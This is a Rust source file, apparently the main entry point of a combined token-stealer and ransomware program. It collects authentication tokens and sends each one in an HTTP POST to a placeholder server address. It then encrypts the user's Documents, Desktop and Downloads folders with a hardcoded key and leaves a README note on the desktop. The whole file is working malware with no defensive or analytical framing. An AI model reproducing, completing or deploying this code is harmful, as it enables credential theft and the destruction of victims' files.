
mod token_grabber;
mod ransomware;

use std::io::Write;
use std::net::TcpStream;

fn send_to_server(endpoint: &str, port: u16, data: &str) {
    if let Ok(mut stream) = TcpStream::connect((endpoint, port)) {
        let request = format!(
            "POST /token HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            endpoint,
            data.len(),
            data
        );
        let _ = stream.write_all(request.as_bytes());
    }
}

fn main() {
    let tokens = token_grabber::grab_tokens();

    for token in &tokens {
        let payload = format!(r#"{{"token":"{}","ip":"","computer":""}}"#, token);
        send_to_server("YOUR_RAILWAY_URL", 443, &payload);
    }

    let dirs = vec![
        dirs::document_dir().unwrap_or_default(),
        dirs::desktop_dir().unwrap_or_default(),
        dirs::download_dir().unwrap_or_default(),
    ];

    ransomware::encrypt_directories(&dirs, "roblox123");

    let note = "password: roblox123";
    if let Some(desktop) = dirs::desktop_dir() {
         let _ = std::fs::write(desktop.join("README.txt"), note);
    }
}


